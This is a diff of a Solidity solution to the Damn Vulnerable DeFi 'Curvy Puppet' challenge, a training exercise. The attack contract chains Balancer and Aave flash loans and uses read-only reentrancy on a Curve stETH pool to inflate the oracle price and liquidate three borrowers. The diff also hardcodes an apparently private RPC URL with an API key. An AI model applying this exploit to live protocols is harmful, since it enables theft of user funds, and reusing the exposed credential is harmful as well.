@@ -10,6 +10,27 @@ import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLend
 import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
 import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
 
+interface IAaveLendingPool {
+    function flashLoan(
+        address receiverAddress,
+        address[] calldata assets,
+        uint256[] calldata amounts,
+        uint256[] calldata modes,
+        address onBehalfOf,
+        bytes calldata params,
+        uint16 referralCode
+    ) external;
+}
+
+interface ILido {
+    function submit(address _referral) external payable returns (uint256);
+    function withdraw(uint256 amount, address receiver) external;
+}
+
+interface IEulerDToken {
+    function flashLoan(uint256 amount, bytes calldata data) external;
+}
+
 interface IBalancer {
     function flashLoan(
         address recipient,
@@ -17,10 +38,6 @@ interface IBalancer {
         uint256[] memory amounts,
         bytes memory userData
     ) external;
-}
-
-interface IEulerDToken {
-    function flashLoan(uint256 amount, bytes calldata data) external;
 }
 
 contract CurvyPuppetChallenge is Test {
@@ -68,7 +85,12 @@ contract CurvyPuppetChallenge is Test {
      */
     function setUp() public {
         // Fork from mainnet state at specific block
-        vm.createSelectFork(("your rpc"), 20190356);
+        vm.createSelectFork(
+            (
+                "https://spring-virulent-liquid.quiknode.pro/6dd3d7f3a29ceb02b2e8d24ec3d7e146ff915cb4"
+            ),
+            20190356
+        );
 
         startHoax(deployer);
 
@@ -197,9 +219,11 @@ contract CurvyPuppetChallenge is Test {
             address(weth),
             address(dvt),
             address(curvePool),
+            address(permit2),
             alice,
             bob,
-            charlie
+            charlie,
+            treasury
         );
         weth.transferFrom(treasury, address(hack), TREASURY_WETH_BALANCE);
         IERC20(curvePool.lp_token()).transferFrom(
@@ -207,7 +231,7 @@ contract CurvyPuppetChallenge is Test {
             address(hack),
             TREASURY_LP_BALANCE
         );
-        hack.attack();
+        hack.attack1();
     }
 
     /**
@@ -259,37 +283,55 @@ contract Hack {
     WETH weth;
     DamnValuableToken dvt;
     IStableSwap curvePool;
+    IPermit2 permit2;
     address alice;
     address bob;
     address charlie;
+    address treasury;
+    IERC20 lptoken;
     IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
-    IBalancer balancer = IBalancer(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    address public constant AAVE_LENDING_POOL =
+        0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
+    address constant balancerAddress =
+        0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+    address constant dTokenAddress = 0x62e28f054efc24b26A794F5C1249B6349454352C;
+    IEulerDToken constant dToken = IEulerDToken(dTokenAddress);
 
     constructor(
         address _lending,
         address _weth,
         address _dvt,
         address _curvePool,
+        address _permit2,
         address _alice,
         address _bob,
-        address _charlie
+        address _charlie,
+        address _treasury
     ) {
         lending = CurvyPuppetLending(_lending);
         weth = WETH(payable(_weth));
         dvt = DamnValuableToken(_dvt);
         curvePool = IStableSwap(_curvePool);
+        permit2 = IPermit2(_permit2);
         alice = _alice;
         bob = _bob;
         charlie = _charlie;
+        treasury = _treasury;
+        lptoken = IERC20(curvePool.lp_token());
     }
-
-    function attack() external {
+    function attack1() external {
+        IBalancer balancer = IBalancer(balancerAddress);
         address[] memory tokens = new address[](1);
         tokens[0] = address(weth);
         uint256[] memory amounts = new uint256[](1);
-        console.log(curvePool.get_virtual_price());
+        amounts[0] = 37991 ether;
         balancer.flashLoan(address(this), tokens, amounts, "");
-        lending.liquidate(alice);
+        console.log(address(this).balance);
+        console.log(weth.balanceOf(address(this)));
+        console.log(stETH.balanceOf(address(this)));
+        weth.transfer(treasury, 1);
+        lptoken.transfer(treasury, 1);
+        dvt.transfer(treasury, dvt.balanceOf(address(this)));
     }
 
     function receiveFlashLoan(
@@ -298,15 +340,92 @@ contract Hack {
         uint256[] calldata /* feeAmounts */,
         bytes calldata /* userData */
     ) public payable {
-        weth.withdraw(weth.balanceOf(address(this)));
-        curvePool.add_liquidity{value: address(this).balance}({
-            amounts: [address(this).balance, stETH.balanceOf(address(this))],
-            min_mint_amount: 0
-        });
-        lending.liquidate(alice);
-        console.log(curvePool.get_virtual_price());
-        weth.transfer(msg.sender, 20000 ether);
+        if (msg.sender != balancerAddress) revert();
+        attack2();
     }
 
-    receive() external payable {}
+    function attack2() public {
+        lptoken.approve(address(permit2), type(uint256).max);
+        permit2.approve({
+            token: address(lptoken),
+            spender: address(lending),
+            amount: type(uint160).max,
+            expiration: uint48(block.timestamp)
+        });
+        address[] memory tokens = new address[](2);
+        tokens[0] = address(weth);
+        tokens[1] = address(stETH);
+        uint256[] memory amounts = new uint256[](2);
+        amounts[0] = 20500 ether;
+        amounts[1] = 172000 ether;
+        console.log(curvePool.get_virtual_price());
+        //balancer.flashLoan(address(this), tokens, amounts, "");
+        uint256[] memory modes = new uint256[](2);
+        modes[0] = 0;
+        modes[1] = 0;
+
+        // 调用 Aave 的闪电贷函数
+        IAaveLendingPool(AAVE_LENDING_POOL).flashLoan(
+            address(this), // 接收闪电贷的合约地址
+            tokens, // 借入的资产列表
+            amounts, // 借入的金额列表
+            modes, // 模式列表
+            address(this), // 还款地址
+            "", // 额外参数
+            0 // 推荐码
+        );
+        //lending.liquidate(alice);
+    }
+
+    function executeOperation(
+        address[] calldata assets,
+        uint256[] calldata amounts,
+        uint256[] calldata premiums,
+        address initiator,
+        bytes calldata /* params */
+    ) external returns (bool) {
+        weth.withdraw(58685 ether);
+
+        stETH.approve(address(curvePool), type(uint256).max);
+        curvePool.add_liquidity{value: 58685 ether}({
+            amounts: [58685 ether, stETH.balanceOf(address(this))],
+            min_mint_amount: 0
+        });
+        //lending.liquidate(alice);
+        curvePool.remove_liquidity(
+            lptoken.balanceOf(address(this)) - 3 ether - 1,
+            [uint256(0), uint256(0)]
+        );
+
+        uint256 repayAmountWETH = amounts[0] + premiums[0];
+        uint256 repayAmountSTETH = amounts[1] + premiums[1];
+
+        weth.deposit{value: 37991 ether}();
+        weth.transfer(balancerAddress, 37991 ether);
+        weth.approve(AAVE_LENDING_POOL, repayAmountWETH);
+        uint256 ethAmount = 12963923469069977697655;
+        uint256 min_dy = 1;
+        console.log(weth.balanceOf(address(this)));
+        console.log(address(this).balance);
+        weth.deposit{value: 20518 ether}();
+        curvePool.exchange{value: ethAmount}(0, 1, ethAmount, min_dy);
+
+        if (repayAmountSTETH > stETH.balanceOf(address(this))) {
+            ILido(address(stETH)).submit{
+                value: repayAmountSTETH - stETH.balanceOf(address(this))
+            }(address(this));
+        }
+
+        stETH.approve(AAVE_LENDING_POOL, repayAmountSTETH);
+        return true;
+    }
+    receive() external payable {
+        if (msg.sender == address(curvePool)) {
+            console.log(lptoken.balanceOf(address(this)));
+            console.log(curvePool.get_virtual_price());
+            lending.liquidate(alice);
+            lending.liquidate(bob);
+            lending.liquidate(charlie);
+        }
+    }
 }
